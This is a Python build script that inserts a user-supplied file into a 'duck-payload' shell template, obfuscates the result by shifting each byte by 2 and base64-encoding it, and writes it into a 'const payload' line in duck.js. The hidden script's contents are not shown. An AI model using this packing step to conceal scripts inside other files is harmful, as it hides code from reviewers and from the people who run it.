#!/usr/bin/env python3

import sys
import re

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <chicken_content_filename>")
    sys.exit(1)

chicken_file = sys.argv[1]

# Read the chicken content
with open(chicken_file, 'r') as f:
    chicken_content = f.read()

# Escape for use in bash echo with double quotes
chicken_content = chicken_content.replace('\\', '\\\\').replace('"', '\\"').replace('$', '\\$').replace('`', '\\`')

# Read duck-payload and replace CHICKEN_CONTENT
with open('duck-payload', 'r') as f:
    script_content = f.read()

script_content = script_content.replace('CHICKEN_CONTENT', chicken_content)

# Increment each byte by 2 with wrapping, then base64 encode
incremented = bytes((b + 2) % 256 for b in script_content.encode())
import base64
payload = base64.b64encode(incremented).decode()

# Replace the payload line in duck.js
with open('duck.js', 'r') as f:
    js_content = f.read()

js_content = re.sub(r"const payload = '.*?';", f"const payload = '{payload}';", js_content)

with open('duck.js', 'w') as f:
    f.write(js_content)

print("Payload created and inserted into duck.js")
